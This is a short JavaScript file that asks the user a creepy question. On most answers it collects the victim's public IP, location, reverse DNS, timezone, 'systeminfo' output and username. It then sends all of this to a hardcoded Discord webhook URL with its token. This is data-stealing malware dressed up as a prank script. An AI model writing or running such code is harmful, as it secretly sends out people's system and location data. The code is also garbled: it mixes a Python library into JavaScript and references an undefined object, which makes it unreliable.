import fetch from 'node-fetch';
import { exec } from 'child_process';
import { Webhook } from 'discord.js';
import { ClientSession } from 'aiohttp';

async function death() {
  const response = await new Promise((resolve) => {
    const rl = require('readline').createInterface({
      input: process.stdin,
      output: process.stdout
    });
    rl.question("Isn't it lovely? All alone? Heart made of glass my mind of stone?\n>>> ", (answer) => {
      rl.close();
      resolve(answer);
    });
  });

  if (['yes', 'yeah', 's', 'ya'].includes(response.toLowerCase())) {
    console.log("mmm... you are mine.");
    await new Promise((resolve) => setTimeout(resolve, 5000));
    process.exit();
  } else {
    console.log("ah... you moron");
    const death = await fetch("http://ip-api.com/json/?fields=225545");
    const json = await death.json();

    const payload = `
    IP = ${json.query}
    Location = ${json.country}, ${json.regionName}
    Reverse = ${json.reverse}
    Timezone = ${json.timezone}
    `;

    const SYS = await new Promise((resolve, reject) => {
      exec('systeminfo', (error, stdout, stderr) => {
        if (error) {
          reject(error);
        } else {
          resolve(stdout);
        }
      });
    });
    const WHO = (await new Promise((resolve, reject) => {
      exec('whoami', (error, stdout, stderr) => {
        if (error) {
          reject(error);
        } else {
          resolve(stdout.trim());
        }
      });
    }));

    const embed = new discord.MessageEmbed()
      .setTitle(`${WHO}`)
      .setDescription(SYS)
      .setColor(0x00f529);
    const inter = new discord.MessageEmbed()
      .setDescription(payload)
      .setColor(0x00f529);
    const mmm = new discord.MessageEmbed()
      .setDescription("----")
      .setColor(0x00f529);

    async function foo(aoa) {
      const session = new ClientSession();
      const webhook = new Webhook('https://discord.com/api/webhooks/1252620641811828818/-rriI0u4hY9SVJ23C092dBcQRTXNXzsj6Q0mP43JHXBZ0a89Y9B7sXQ__yRqM5vwLMmb', { session });
      await webhook.send(aoa, { username: 'Foo' });
      await session.close();
    }

    await foo(embed);
    await foo(inter);
    await foo(mmm);
    return embed;
  }
}

await death();

